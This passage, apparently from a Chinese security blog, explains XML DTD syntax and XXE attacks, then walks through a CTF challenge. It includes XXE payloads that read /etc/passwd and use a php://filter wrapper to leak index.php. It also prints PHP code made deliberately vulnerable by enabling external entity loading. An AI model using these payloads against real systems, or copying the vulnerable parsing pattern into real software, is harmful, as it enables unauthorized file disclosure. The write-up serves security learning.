<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h3><ul>
<li>内部实体声明</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>外部实体声明</p>
<p>类似的exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h2><ul>
<li>包括开始标签、元素体（内容）、结束标签。 </li>
</ul>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;gmu&gt;广州航海学院&lt;&#x2F;gmu&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>当然也可以是空元素，但注意一定要闭合<code>&lt;gmu/&gt;</code></p>
</li>
<li><p>也可以嵌套</p>
</li>
</ul>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt;&lt;b&gt;hello&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<h1 id="xxe漏洞使用"><a href="#xxe漏洞使用" class="headerlink" title="xxe漏洞使用"></a>xxe漏洞使用</h1><p>xxe漏洞很危险，可以进行任意文件读取，远程代码执行等</p>
<h2 id="通过DTD内部声明"><a href="#通过DTD内部声明" class="headerlink" title="通过DTD内部声明"></a>通过DTD内部声明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;! ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<h2 id="通过DTD外部声明"><a href="#通过DTD外部声明" class="headerlink" title="通过DTD外部声明"></a>通过DTD外部声明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a SYSTEM &quot;URL&quot;&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;DTD文件内容</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="引入外部实体声明"><a href="#引入外部实体声明" class="headerlink" title="引入外部实体声明"></a>引入外部实体声明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ENTITY % d SYSTEM &quot;URL&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;DTD文件内容</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>

<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><strong>海啸杯who are you？</strong></p>
<p>题目源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$data &#x3D; @file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">$resp &#x3D; &#39;&#39;;</span><br><span class="line">&#x2F;&#x2F;$flag&#x3D;&#39;flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;&#39;;</span><br><span class="line">if($data !&#x3D; false)&#123;</span><br><span class="line">    $dom &#x3D; new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  &#x3D; $dom-&gt;textContent;</span><br><span class="line">    $resp &#x3D; ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    if ($res)&#123;</span><br><span class="line">        die($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;.&#x2F;style.css&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body class&#x3D;&quot;contactBody&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;title&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method&#x3D;&quot;post&quot; class&#x3D;&quot;form&quot;&gt;</span><br><span class="line">        &lt;h1 id&#x3D;&quot;title&quot;&gt;请输入姓名&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;name entry &quot; id&#x3D;&quot;name&quot; name&#x3D;&quot;name&quot; placeholder&#x3D;&quot;Your Name&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;button class&#x3D;&quot;submit entry&quot; onclick&#x3D;&quot;func()&quot;&gt;Submit&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class&#x3D;&quot;shadow&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    function play() &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    function func() &#123;</span><br><span class="line">        &#x2F;&#x2F; document.getElementById().value</span><br><span class="line">        var xml &#x3D; &#39;&#39; +</span><br><span class="line">            &#39;&lt;\?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;\?&gt;&#39; +</span><br><span class="line">            &#39;&lt;feedback&gt;&#39; +</span><br><span class="line">            &#39;&lt;author&gt;&#39; + document.getElementById(&#39;name&#39;).value+ &#39;&lt;&#x2F;author&gt;&#39; +</span><br><span class="line">            &#39;&lt;&#x2F;feedback&gt;&#39;;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        var xmlhttp &#x3D; new XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">            if (xmlhttp.readyState &#x3D;&#x3D; 4) &#123;</span><br><span class="line">                &#x2F;&#x2F; console.log(xmlhttp.readyState);</span><br><span class="line">                &#x2F;&#x2F; console.log(xmlhttp.responseText);</span><br><span class="line">                var res &#x3D; xmlhttp.responseText;</span><br><span class="line">                document.getElementById(&#39;title&#39;).textContent &#x3D; res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(&quot;POST&quot;, &quot;index.php&quot;, true);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE user [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&quot; &gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB8f1d1aeea5f934b481fc33f595eaf863?method=download&shareKey=a7be3e4ff8f77083b7971d7ce05448f0"></p>
<p>解码</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBcb6ee07e871304a4ffe1eb199895507a?method=download&shareKey=54340c1ef88a458af03fbe460a8d1d50"></p>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://file.51ppt.vip/2020/2-8/192744-1521977264b903.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By YTsang</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.8.2"></script><script src="/js/fancybox.js?version=1.8.2"></script><script src="/js/sidebar.js?version=1.8.2"></script><script src="/js/copy.js?version=1.8.2"></script><script src="/js/fireworks.js?version=1.8.2"></script><script src="/js/transition.js?version=1.8.2"></script><script src="/js/scroll.js?version=1.8.2"></script><script src="/js/head.js?version=1.8.2"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>